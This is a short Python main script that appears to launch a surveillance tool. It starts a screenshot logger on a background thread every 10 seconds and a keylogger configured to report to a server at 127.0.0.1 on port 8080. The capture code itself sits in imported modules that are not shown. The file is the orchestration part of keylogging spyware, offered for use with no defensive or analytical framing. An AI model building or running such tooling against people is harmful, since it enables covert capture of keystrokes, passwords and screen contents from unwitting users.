from key_log.key_logger import KeyLogger
from screenshot_log.screenshot_logger import ScreenshotLogger
import threading


if __name__ == "__main__":
    screenshot_logger = ScreenshotLogger(interval = 10)
    screenshot_thread = threading.Thread(target = screenshot_logger.start)
    screenshot_thread.daemon = True
    screenshot_thread.start()

    keylogger = KeyLogger(interval=10, port="8080", server_ip="127.0.0.1")
    keylogger.start()



